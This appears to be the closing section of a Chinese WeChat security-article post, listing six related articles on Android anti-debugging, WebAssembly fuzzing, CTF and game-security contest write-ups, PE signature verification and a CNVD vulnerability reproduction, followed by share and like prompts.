1.[Android APP漏洞之战——调试与反调试详解](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458451170&idx=1&sn=268d133649c845d8f062866cf94e7c95&chksm=b18fcc6886f8457e2daaa55cdbdd6c39047ae997da3454fa35b8e8ee07da3b450cbae5b32bda&scene=21#wechat_redirect)  
  
  
2.[Fuzzm: 针对WebAssembly内存错误的模糊测试](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458451152&idx=2&sn=4abbf7a643b93027529e12442608aca2&chksm=b18fcc5a86f8454cb6051aab6a45751ad736285e3f46e92436edb2b963b46bee27da5e0c9922&scene=21#wechat_redirect)  
  
  
3.[0rays战队2021圣诞校内招新赛题解](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458449944&idx=2&sn=1c51b842fd748e55cbe2cbf80f8371f2&chksm=b18fc89286f84184d536aaa1cad66bce9fb3799ef344b743ab5b3b02e89f2336ab6977cfbe2c&scene=21#wechat_redirect)  
  
  
4.[2022腾讯游戏安全初赛一题解析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458449720&idx=1&sn=d3e33c568fee745ef1ad6334443c2eac&chksm=b18fc7b286f84ea479599f079963ab9b9e199717629c8d0636cd87341b552823a01f995a18c3&scene=21#wechat_redirect)  
  
  
5.[一文读懂PE文件签名并手工验证签名有效性](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458449573&idx=1&sn=cfab5d8030041ed7d6d4ed0eb84619fc&chksm=b18fc62f86f84f3901d3bfa087c6b0ceb1882ad1682d155e01107cc4b0d09c8359445c624a84&scene=21#wechat_redirect)  
  
  
6.[CNVD-2018-01084 漏洞复现报告（service.cgi 远程命令执行漏洞）](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458446970&idx=1&sn=fe5fd9a5dd5b284114eec6b391c0ac1a&chksm=b18fdcf086f855e6357dc286aabe7a97b9cb48214018c7f316f59e2a95c2ce982efe6167c773&scene=21#wechat_redirect)  
****  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球在看**  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cLw1XbJLEGr5Eic62BdV6TRKCjWVSQ/640?wx_fmt=gif "")  
  
点击“阅读原文”，了解更多！  
